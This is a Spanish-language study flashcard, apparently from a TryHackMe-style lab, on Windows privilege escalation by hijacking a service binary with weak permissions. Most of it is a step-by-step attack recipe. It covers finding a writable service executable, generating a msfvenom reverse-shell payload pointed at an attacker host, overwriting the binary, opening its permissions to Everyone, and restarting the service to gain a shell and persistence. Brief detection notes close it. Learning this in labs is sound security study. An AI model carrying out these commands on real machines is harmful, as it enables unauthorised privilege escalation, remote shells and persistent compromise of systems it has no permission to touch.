Flashcard – **Service Binary Hijacking (Insecure Permissions)**

---

### Descubrimiento

**Enumerar servicios**

```cmd
sc qc WindowsScheduler
```

→ Detecta:

* `BINARY_PATH_NAME : C:\PROGRA~2\SYSTEM~1\WService.exe`
* `START_TYPE : AUTO_START`
* Corre como `.\svcusr1`.

**Revisar permisos del binario**

```cmd
icacls "C:\PROGRA~2\SYSTEM~1\WService.exe"
```

→ Salida:

* `Everyone:(M)` → cualquier usuario puede **modificar** el binario.

**Revisar permisos del directorio**

```cmd
icacls "C:\PROGRA~2\SYSTEM~1"
```

→ `Everyone:(OI)(CI)(M)` → también modificable recursivamente.

**Conclusión**: El servicio carga un binario en una ruta donde cualquier usuario puede sobrescribirlo. **Vulnerable a Privilege Escalation.**

---

### Explotación

**1. Generar payload (ejemplo con msfvenom)**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o WService.exe
```

**2. Reemplazar binario**

```cmd
copy /Y WService.exe "C:\PROGRA~2\SYSTEM~1\WService.exe"
```
**2.b le das permisos**
```
icacls WService.exe /grant Everyone:F
```

**3. Forzar ejecución**

* Si tienes permisos:

```cmd
sc stop WindowsScheduler
sc start WindowsScheduler
```

* Si no: esperar **reinicio del sistema** (se ejecutará en AUTO\_START).

---

### Resultado

* El payload se ejecuta bajo la cuenta de servicio `svcusr1`.
* Si `svcusr1` tiene privilegios administrativos o más altos que `thm-unpriv`, se obtiene escalada.
* Persistencia: siempre que el servicio arranque, correrá el binario malicioso.

---

### Notas Operativas

* **Detección**: cualquier binario con permisos `Everyone:(M)` o `Users:(M)` en un servicio de Windows es un vector típico de **Service Binary Hijacking**.
* **Persistencia**: como el servicio es `AUTO_START`, la escalada está garantizada tras reinicio aunque no se pueda reiniciar manualmente.

---
